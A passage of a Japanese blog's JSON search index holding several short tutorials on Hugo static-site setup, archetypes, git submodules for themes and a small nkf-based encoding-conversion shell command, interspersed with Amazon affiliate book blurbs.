-wLu wLu \u0026gt; wLu.txt # wLu.txtをwLuにリネームします $ mv wLu.txt wLu # 作成したwLuコマンドファイルを/usr/local/bin にコピーします $ sudo wLu /usr/local/bin/ # コマンドが配置されたかを確認 $ which wLu $ /usr/local/bin/wLu 使い方 # UTF-8以外のファイルエンコードファイル $ cat moto.txt $ wLu moto.txt 変換結果を一時ファイルにし、リネームする手間が省けます。\n便利ですね。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-23T10:27:27+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-23-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-23-suzuki/","title":"【wLu】Bashで便利なコマンドを作ってみようって話"},{"content":"エラーの内容 記事投稿時にfailed to unmarshal YAM エラーが起こった時の原因について\nhugo new ファイル名 で投稿用のエントリーを作成し、いざhugo コマンドで記事をアップしようとした時に以下のエラーが出ました。\nStart building sites …\nTotal in 10 ms\nError: Error building site: \u0026ldquo;/xxxx/xxxx/xxxx.github.io/content/posts/2021-12-21-03.md:2:1\u0026rdquo;: failed to unmarshal YAML: yaml: control characters are not allowed\n原因 このようなエラーが出る場合原因として考えられるのがファイルの文字コードがUTF-8になってないことです。\nvim でファイル名を開くと右下に文字コードが表示されますが「iso-2022-jp-3」のようになってませんでしょうか？\n対応 この場合ファイルの文字コードをUTF8に変更してみましょう。\nnkf -wLu ファイル名 \u0026gt;一時保存ファイル名; mv 一時保存ファイル名 ファイル名 一時保存した後にmvで戻したり面倒ですよね。\nhugo new した時に日本語が含まれていたら文字コードutf8になると思われるので設定で回避できないか次回調べてみたいと思います。\n","date":"2021-12-22T21:22:23+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-21-03/error_hu7e39d96c0286759ff592e45a50a24444_91990_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-21-03/","title":"hugoで[failed to unmarshal YAML]エラーが出た場合の対処法"},{"content":"github pagesでもgoogle adsenseの審査に通過したい！\nということで色々先人の方達のサイトをみさせていただいたところ\ngoogle adsenseを通過するためにはプライバシーポリシーが必要ということで準備しました。\n内容はとりあえずコピペで行こう まずはコピペOKの親切な方のサイトを探します。\n内容については以下のサイトを参考にさせていただきました。\nhttp://liberty-life-blog.com/wordpress/privacy-policy/\n設定 以下のコマンドでhugoでページを作成します。\nhugo new page/privacy.md コンテンツの構成を以下のように管理しているのでpage以下に保存しました。\ncontent/posts \u0026ndash; 記事\n/page \u0026ndash; about usページなど\n/assetes \u0026ndash; 画像など\nvim content/page/privacy.md --- title: \u0026#34;Privacy\u0026#34; date: 2021-12-22T17:16:15+09:00 draft: false --- ページの内容を２個目の\u0026mdash;以下に貼り付けます\ndraft: true に変更します\nhugo ビルドします\nフッターにリンクを置こう フッターの内容を修正してプライバシーポリシーのリンクを設置します。\nthemes以下にあるファイルを直接書き換えるのではなく\nlayoutsフォルダ以下に同名のファイルを作成することで上書きすることができるみたいです。\nlayouts/partial/footer/footer.html\u0026lt;\u0026ndash;優先順位高い\nthemes/テーマ名/layouts/partial/footer/footer.html\nlayouts/partial/footer/footer.html を新規に作成して\n以下の内容を入力\n\u0026lt;footer class=\u0026#34;site-footer\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;{{ .Site.BaseURL }}privacy/\u0026#34;\u0026gt;プライバシーポリシー\u0026lt;/a\u0026gt; \u0026lt;section class=\u0026#34;copyright\u0026#34;\u0026gt; \u0026amp;copy; {{ if and (.Site.Params.footer.since) (ne .Site.Params.footer.since (int (now.Format \u0026#34;2006\u0026#34;))) }} {{ .Site.Params.footer.since }} - {{ end }} {{ now.Format \u0026#34;2006\u0026#34; }} {{ .Site.Title }} \u0026lt;/section\u0026gt; \u0026lt;/footer\u0026gt; リンクの書き方が\n{{ .Site.BaseURL }}privacy/\nのは注意\n","date":"2021-12-22T17:40:27+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-21-02/privacy_hu6d356af4ff9900abfdb99df6dc97252e_302641_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-21-02/","title":"プライバシーポリシーページを設置する"},{"content":"CMSではWordPressが有名ですが、phpやサーバの準備などに時間がかかってしまったり、ちょっと敷居が高いイメージではないでしょうか。\nWordPressのインストールのためにはサーバも必要ですし、ドメインだって必要です。\n色々用意するのが手間だなと思う人は、Hugo+GitHubで簡単に、早く、さっくりとサイトを作ってしまうのをオススメします。\n無料で、httpsも設定できるので非常に便利です。\nHUGOとは HUGOとはGo言語で記述され、速度や使いやすさ、設定のしやすさなどを重視して最適化された静的なHTMLやCSSのサイトジェネレーターです。コンテンツとテンプレートを分けて構築し、それらを組み合わせてHTMLをレンダリングします。\nHugoでブログを記述する際には「Markdown」と呼ばれる言語を使います。\nサイトを公開、再構築する際には「hugo」というコマンドを使用します。\nこのコマンドはどのディレクトリからでも実行することができるので、特権アカウントを持っていない共有ホストやその他のシステムで使用することも可能です。\nそして、中程度のサイズの典型的なWebサイトをほんの一瞬でレンダリングします。\n経験則として、各コンテンツは約1ミリ秒でレンダリングされ、ブログやドキュメントなど、どのような種類のウェブサイトでもうまく動作するように設計されています。\nサポートされるアーキテクチャ サポートされるアーキテクチャは2022年1月時点で、Windows、Linux、FreeBSD、NetBSD、DragonFly BSD、OpenBSD、macOS (Darwin)、 Android用にx64、i386、ARMアーキテクチャ用のHugoバイナリをビルド済みで提供しています。\nHUGOは、Goコンパイラツールが実行できる場所であれば、ソースからコンパイルすることもできます。たとえば、Plan 9やSolarisを含む他のオペレーティングシステムにも対応しています。\nHugoのインストール HUGOをサイトジェネレーターとして使用する場合は、すごく簡単で、Hugoバイナリをインストールするだけで、バイナリには外部依存関係はありません。\nバイナリ（クロスプラットフォーム） GitHubにある Releases からプラットフォームに適したバージョンをダウンロードします。\nダウンロードしたバイナリはどこからでも実行可能です。\nグローバルな場所にインストールする必要はなく、権限のないアカウントや共有ホストやその他のシステムでも動作します。\n理想的には、 /usr/local/bin など使いやすいようにどこかにインストールする必要があります。\nMacでbrewを使う場合 macOSを使用していて、Homebrewを使用している場合は、次のワンライナーを使用してHugoをインストールできます。\n※端末はMacで進めていきます。開発なども便利なのでMacを持っていると何かと便利ですよ。\nbrew install hugo MacPortsの場合 macOSを使用していてMacPortsを使用している場合は、次のワンライナーを使用してHugoをインストールできます。\nport install hugo その他の端末でもコマンドを利用してダウンロード可能です。\n詳しくは Install Hugo を見てみてください。\n設定 HUGOはさまざまなコマンドラインの機能を備えていますが、コマンドラインに不慣れな場合でも簡単に使用できます。\n以下は、Hugoプロジェクトの開発中に使用するもっとも一般的なコマンドの説明です。\nインストールの確認 Hugoをインストールしたら、PATHがあることを確認してください。helpコマンドを使用して、Hugoが正しくインストールされていることをテストできます。\nhugo help 実行すると、コンソールに表示される出力は次のようになるかと思います。\nhugo is the main command, used to build your Hugo site. Hugo is a Fast and Flexible Static Site Generator built with love by spf13 and friends in Go. Complete documentation is available at http://gohugo.io/. Usage: hugo [flags] hugo [command] Available Commands: check Contains some verification checks completion generate the autocompletion script for the specified shell config Print the site configuration convert Convert your content to different formats deploy Deploy your site to a Cloud provider. env Print Hugo version and environment info gen A collection of several useful generators. help Help about any command import Import your site from others. list Listing out various types of content mod Various Hugo Modules helpers. new Create new content for your site server A high performance webserver version Print the version number of Hugo Flags: -b, --baseURL string hostname (and path) to the root, e.g. http://spf13.com/ -D, --buildDrafts include content marked as draft -E, --buildExpired include expired content -F, --buildFuture include content with publishdate in the future --cacheDir string filesystem path to cache directory. Defaults: $TMPDIR/hugo_cache/ --cleanDestinationDir remove files from destination not found in static directories --config string config file (default is path/config.yaml|json|toml) --configDir string config dir (default \u0026#34;config\u0026#34;) -c, --contentDir string filesystem path to content directory --debug debug output -d, --destination string filesystem path to write files to --disableKinds strings disable different kind of pages (home, RSS etc.) --enableGitInfo add Git revision, date and author info to the pages -e, --environment string build environment --forceSyncStatic copy all files when static is changed. --gc enable to run some cleanup tasks (remove unused cache files) after the build -h, --help help for hugo --i18n-warnings print missing translations --ignoreCache ignores the cache directory --ignoreVendor ignores any _vendor directory --ignoreVendorPaths string ignores any _vendor for module paths matching the given Glob pattern -l, --layoutDir string filesystem path to layout directory --log enable Logging --logFile string log File path (if set, logging enabled automatically) --minify minify any supported output format (HTML, XML etc.) --noChmod don\u0026#39;t sync permission mode of files --noTimes don\u0026#39;t sync modification time of files --path-warnings print warnings on duplicate target paths etc. --poll string set this to a poll interval, e.g --poll 700ms, to use a poll based approach to watch for file system changes --print-mem print memory usage to screen at intervals --quiet build in quiet mode --renderToMemory render to memory (only useful for benchmark testing) -s, --source string filesystem path to read files relative from --templateMetrics display metrics about template executions --templateMetricsHints calculate some improvement hints when combined with --templateMetrics -t, --theme strings themes to use (located in /themes/THEMENAME/) --themesDir string filesystem path to themes directory --trace file write trace to file (not useful in general) -v, --verbose verbose output --verboseLog verbose logging -w, --watch watch filesystem for changes and recreate as needed Use \u0026#34;hugo [command] --help\u0026#34; for more information about a command. hugoコマンド 一般的な使い方は、カレント・ディレクトリを入力ディレクトリとしてhugoを実行することだと思います。\nデフォルトでpublic/ ディレクトリにウェブサイトを生成しますが、サイトの設定（configファイル）でpublishDirフィールドを変更することにより、出力ディレクトリをカスタマイズできます。\nhugoコマンドはサイトをpublic/ディレクトリにレンダリングし、ウェブサーバにデプロイする準備ができます。\n$ hugo 0 draft content 0 future content 99 pages created 0 paginator pages created 16 tags created 0 groups created in 90 ms 使ってみる hugoのインストールが終わったら、サイトを作成します。\nhugo new site ＜作成するディレクトリ＞ 色々表示されているかと思いますが、気にしないで大丈夫です。\n設定ファイル hugoの設定はTOMLという形式で記述します。\nTOMLに慣れていない人はJSONやYAMLといった形式でも記述できます。\nその場合はconfig.tomlを削除してください。\nbaseURL = \u0026#34;http://example.org/\u0026#34; languageCode = \u0026#34;en-us\u0026#34; title = \u0026#34;My New Hugo Site\u0026#34; baseURL: サイトの公開URL languageCode: HTMLのlang部分 title: サイトの名前 記事の投稿 記事を作成するにはコマンドを打つ必要があります\nhugo new posts/helloworld.md このコマンドで、postsディレクトリ以下にhelloworld.mdといったファイルが生成されます\nテーマによってはpostsディレクトリではなく、postであったりするので、テーマの詳細を確認してください。\n下書きから公開へ 作成されたファイルはmarkdown形式で記述されています。\n--- title: \u0026#34;helloworld\u0026#34; date: 2021-12-22T11:23:09Z draft: true --- draftの部分が下書き状態を表しています。\nfalseにすることで公開となり表示されます。\nHUGOでの下書き、未来、期限切れについて Hugoでは、コンテンツの記述時にドラフト、公開日、そして有効期限を設定できます。デフォルトでは、Hugoは公開（draft: true）しません。\nまた、以下の場合はコンテンツを公開しないので、注意してください\npublishdateが将来の公開日を指定したコンテンツ draft: trueのステータスを持つコンテンツ 有効期限（expirydate）を過ぎたコンテンツ 予約投稿 公開日付（publishdate）が未来で、公開状態にある記事は予約投稿として扱われます。 有効期限付き expirydate に日付を指定することで、記事の有効期限を設定することも可能です。 確認 サイトの確認を行うには\nhugoをインストールしたディレクトリで\nhugo server を実行します。\nこの場合は公開されている記事のみを表示した状態のサーバが立ち上がります。\n未公開も含めたい場合は\nhugo server -D とすることで表示できます。\n公開 公開をするにはサイト全体を構築し直す必要があります。\nhugo このコマンドでサイト全体が自動的に生成されます。\n作成されたサイトは初期状態ではpublicディレクトリに展開されます。\nconfigのpublicDirに任意のディレクトリを設定することも可能です\npublicDir = \u0026#39;docs\u0026#39; この場合はdocsディレクトリに公開ファイルが展開されます。\n終わりに 駆け足でしたが、hugoの簡単な使い方になります。\n大きな設定も不要で、markdownで記述できるので初心者やデザイナーなどでもとっつきやすいのではないかと思います。\nみなさんもぜひ、hugoを試してみてください。\nオススメの書籍 Hugoで始める静的サイト構築入門　静的サイトジェネレーターで作る自作サイト (技術の泉シリーズ（NextPublishing）) 本書は静的サイトジェネレーターの一つであるHugoの解説書です。できるだけ低コストでサイトを運用したい、WordPressなどの各種CMSから移行したい、というケースに合わせて構築方法などを解説します。Hugoを利用してオリジナリティーのあるサイトを自分で構築、管理したい方に向けての一冊です。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 【特典付き! 】Webサイト高速化のための 静的サイトジェネレーター活用入門 (Compass Booksシリーズ) GatsbyJSで実現する、高速\u0026amp;実用的なサイト構築 「高速化\u0026amp;最適化」「メタデータ対応」「SPAやPWAへの対応」など、これからのWebサイトに求められる要素に対応するための、静的サイトジェネレーターの活用書。 本書は「GatsbyJS(Gatsby)」を使って、「ReactやJavaScript(ECMAScript)に自信が無くても、実用レベルのWebサイトを構築できるようになる」ことを目標にしています。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) 本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-22T13:07:49+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-22-hugo-01-ywat/2021-12-22-hugo-01_hub5e89b620d2afe5c10cf3894738f1203_83896_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-22-hugo-01-ywat/","title":"デザイナーでもできる初めてのHUGOでのサイト作成 #01"},{"content":"Hugoではテーマ（theme）を使って簡単にブログやサイトを作成することが可能です。テーマはGitHubなどにたくさん公開されて簡単に導入することが可能です。\nしかし、テーマををインストールするのを忘れてしまうと、不具合の原因につながってしまうので注意が必要です。\n今回はHugoを使って構築したサイトで、テーマが反映されずに画面が真っ白のまま担ってしまった場合の対処法を説明してきます。\nテーマはサブモジュールでインストール テーマはGitで管理されていることが多いので、そのままインストールしてしまうとHugoのディレクトリを汚染してしまいます。\nHugoでテーマをインストールする際はサブモジュール（submodule）として管理するようにしましょう。そうすることで、本来のHugoディレクトリに影響を与えることなく、テーマのアップデートなどを実行できます。\nサイトをクローンしたら画面が真っ白のままになった Hugoで作成したサイトを別の端末などでクローンした際に、画面が真っ白になってしまうことがあります。この問題に直面した場合は、まずはテーマがインストールされているかを確認しましょう。\nインストールされていない場合は、サブモジュール化されたテーマを再度インストールすることで画面が真っ白い状態から正常な表示に変わるかと思います。\nサブモジュールのインストールコマンドは下記のようになります。\ngit submodule update --init --recursive Hugoのサイトをgit cloneする際は、テーマが反映されない場合が多いので、サブモジュールのインストールも忘れずに行うようにしましょう。\nクローンするときに一緒にサブモジュールもインストール そうは言っても、サブモジュールのインストールを忘れることが多いです。\nその場合は、初回git cloneする際にsubmodule（サブモジュール）も一緒にcloneすることで不具合を起こすことなく、表示することができます。\ngit clone --recursive {クローンしたいリポジトリ} まとめ Hugoでテーマが反映されない（画面が真っ白のまま）のときの対応はいかがだったでしょうか。\nサブモジュールで管理できるのは便利であると同時に、忘れてしまうとサイトの不具合につながってしまい、別端末で正常に動作していると解決が難しくなってしまうことも多いと思います。\nHugoのサイトをgit cloneする際はサブモジュールでテーマの反映も忘れないようにしておきましょう。\nおすすめの書籍 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 マンガと実践で学ぶGitの入門書が最新情報に対応して改訂しました! Gitの概念はもちろん、GitHubについても丁寧に解説しています。これからGitを使い始める人にオススメの1冊です。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 いちばんやさしいGit\u0026amp;GitHubの教本 人気講師が教えるバージョン管理\u0026amp;共有入門 (「いちばんやさしい教本」シリーズ) 実際のワークフローをイメージしながら 実践的なGit/GitHubの使い方が身につく「いちばんやさしい」入門書です。 前半は、手元のパソコンでファイルを実際にバージョン管理しながら、 Gitの基本的な使い方を解説。 後半では、実践的なワークフローに沿ってGitHubを使い、 チームメンバーと一緒に開発を進めるための知識が身につきます。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-21T18:08:57+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-21/2021-12-21_hud06831bf5e2aede9b7d29f34463c4a46_63839_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-21/","title":"Hugoでテーマが反映されない（画面が真っ白のまま）"},{"content":"記事を投稿する hugoで記事を作成して、投稿するためには専用のコマンドを使ってファイルを作成するか、postsなどのディレクトリにmarkdownの.mdファイルを設置する必要があります。\n今回はhugoでの記事の投稿の仕方を説明いたします。\nhugo newで記事を投稿 HUGOで記事を投稿するには、専用のコマンド hugo new を使う必要があります。\nこのコマンドを実行すると、提供されたパスに基づいて作成するファイルの種類を推測し、新しいコンテンツファイルを作成して日付とタイトルを自動的に設定します。\n-k KIND で種類を指定することもできます。\nテーマまたはサイトでアーキタイプが提供されている場合は、それらが使用されます。\nこれは、サイトのルートディレクトリ内で実行してください。\nhugo new [path] [flags] postsというディレクトリにファイルを作成する場合は以下のようになります。\n$ hugo new posts/[ファイル名].md このファイルを開いてみてみると、\n--- title: \u0026#34;Test\u0026#34; date: [作成日時] draft: true --- このようなファイルが作成されているかと思います。ファイルの中身の構成は下記のようになります。\ntitle: 記事のタイトル date: 記事の作成日 draft: 下書きかどうか draft: false にする事でドラフトを公開にすることができる\n上記のような作成ファイルの他に、HUGOにはさまざまな情報を Params として付与することが可能です\n新規作成した際にできるファイルの初期値を変えたい場合はどうしたらいいでしょうか？\nhugo newをカスタマイズする hugo new した際にできるファイルの初期値を変えるには、\narchetypes/posts.md archetypes/default.md などのファイルを修正してやることで可能です。\n実際にファイルを見てみると初期状態では下記のようになっていました。\n--- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; date: {{ .Date }} draft: true --- ではここに、画像やカテゴリのフィールドを追加してみましょう。\nさきほどのを開いて、編集します。\n今回はキャッチ画像とカテゴリを追加するので、imageとcategoriesを追加します。\n--- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; date: {{ .Date }} draft: true image: \u0026#34;\u0026#34; categories: - カテゴリ名 --- この状態でファイルを保存して、hugo new で新規作成して見ましょう。\nすると、初期状態のファイルではなかったimageとcategoriesの項目が追加されているかと思います。\nさらに、categoriesには「カテゴリ名」というカテゴリも反映されているかと思います。このように、初期値を調整することが可能なのです。\nこれを応用すると、初期状態を下書きではなく、公開状態でファイルを新規作成することも可能です。\n公開用ビルドする さて、記事がかけたところで、サイトを公開しようといたしましょう。\n残念なことに、hugoで作成したファイルはmarkdown形式であるために、そのままではwebページに公開できません。\n作成したファイルを静的HTMLとして書き出し、ビルド（構築）する必要があるのです。\nビルドは一瞬で終わってしまうのがhugoのすごいところです。\nhugoで作成したファイルをビルドするためのコマンドが以下になります。\n$ hugo 上記のコマンドを実行することで、publicディレクトリにHTMファイルが生成されます。\n実行した際に、サイトの情報も表示されているので、合わせて確認するとなにか新しい発見があるかもしれません。\nStart building sites … hugo v0.91.0+extended darwin/amd64 BuildDate=unknown | JA -------------------+------ Pages | 185 Paginator pages | 42 Non-page files | 205 Static files | 9 Processed images | 620 Aliases | 56 Sitemaps | 1 Cleaned | 0 Total in 981 ms さて、publicディレクトリのファイルをサーバにアップすることでサイトが公開できるということになります。\nオススメの書籍 Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) 【プレーンテキストでらくらくライティング! Markdownを使いこなそう! 】 本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 〈本書の対象読者〉 執筆のストレスを減らして集中したい人 PCが古くて軽いアプリで執筆したい人 いろいろなアプリで原稿を使いまわしたい人 思いついた時にスマホでメモ書きして原稿にまとめたい人 続きを読む 。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-21T18:08:57+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-21-01/2021-12-21-1_hubb580b3412968a99eba9faea3f838cef_148014_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-21-01/","title":"Hugoで記事を投稿してみよう！Hugoでの記事投稿の仕方。"}]